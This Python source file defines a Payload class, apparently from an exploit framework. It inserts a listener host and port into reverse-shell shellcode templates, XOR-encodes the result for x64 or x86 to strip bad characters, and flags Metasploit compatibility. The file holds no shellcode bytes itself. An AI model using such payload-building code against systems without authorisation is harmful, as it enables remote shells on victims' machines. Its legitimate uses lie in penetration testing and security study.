from extra_functions.xor_encode64 import Encoder64
from extra_functions.xor_encode86 import Encoder86
from extra_functions.set_address_shellcodes import get_address
from struct import pack
from socket import inet_aton
import extra_functions.color as color
import extra_functions.custom_print as custom_print


class Payload():
    def __init__(self, shellcode, size, use_metaploit=False, info_metasploit="", arq="x64", single=False, need_encode=True):
        self.shellcode = shellcode
        self.size = size
        self.use_metaploit = use_metaploit
        self.info_metasploit = info_metasploit
        self.arq = str(arq)
        self.single = single
        if not single:
            self.options = {
                "lhost": ["Host to connect the shell", "", True],
                "lport": ["Port to connect the shell", "", True],
            }
        else:
            self.options = {}
	# Some payloads don't need encode
        if need_encode:
            self.options["encode"] =  ["Host to connect the shell", False, False]
            self.options["badchars"] =  ["Bad characters (example \\x00,\\xab)", "\\x00", True]
    
    def get_info_metasploit(self):
        if not self.use_metaploit:
            return "This payload is not compatible with Metasploit"
        return "Compatible with Metasploit: " + self.info_metasploit
        
    def get_shellcode(self):
        if not self.single:
            port =self.options["lport"][1]
            host = self.options["lhost"][1]
            if "encode" in self.options and self.options["encode"][1]:
                if self.arq == "x64":
                    sh_aux = self.shellcode % (pack(">h",int(port)), inet_aton(host))
                    enc = Encoder64(sh_aux, self.options["badchars"][1])
                    sh_aux = enc.execute()
                else:
                    #TODO
                    sh_aux = self.shellcode % (inet_aton(host), pack(">h",int(port)))
                    enc = Encoder86(sh_aux, self.options["badchars"][1])
                    sh_aux = enc.execute()
            else:
                p, h = get_address(port, host)
                if self.arq == "x64":
                    sh_aux = self.shellcode % (p,h)
                else:
                    sh_aux = self.shellcode % (h,p)
        else:
            if "encode" in self.options and self.options["encode"][1]:
                if self.arq == "x64":
                    enc = Encoder64(self.shellcode, self.options["badchars"][1])
                    sh_aux = enc.execute()
                else:
                    #TODO
                    enc = Encoder86(self.shellcode, self.options["badchars"][1])
                    sh_aux = enc.execute()
            else:
                sh_aux = self.shellcode
            
        return sh_aux

    def put(self, key, value):
        try:
            self.options[key][1] = value
            custom_print.info(key + " => " + value)
        except:
            custom_print.error("Wrong option: " + key)
    
    def get_size(self):
        return self.size
    
    def metasploit_compatible(self):
        return self.use_metaploit

    def get_options(self):
        return self.options

    def print_options(self):
        print(color.YELLOW + "\n.. PAYLOAD OPTIONS .." + color.RESET)
        print("__________________________________________________________________\n")
        if not len(self.options):
            print("The aren't options")
        for key, value in self.options.items():
            print(key + " (Required: %s)" % (value[2]))
            print("-" * len(key))
            print(" Description: ")
            print("  |--> " + value[0])
            print(" Value: ")
            aux_value = value[1]
            if type(aux_value) == type([]):
                for v in aux_value:
                    print("  |-->", v)
            else:
                print("  |--> ", aux_value)
        print("__________________________________________________________________\n")
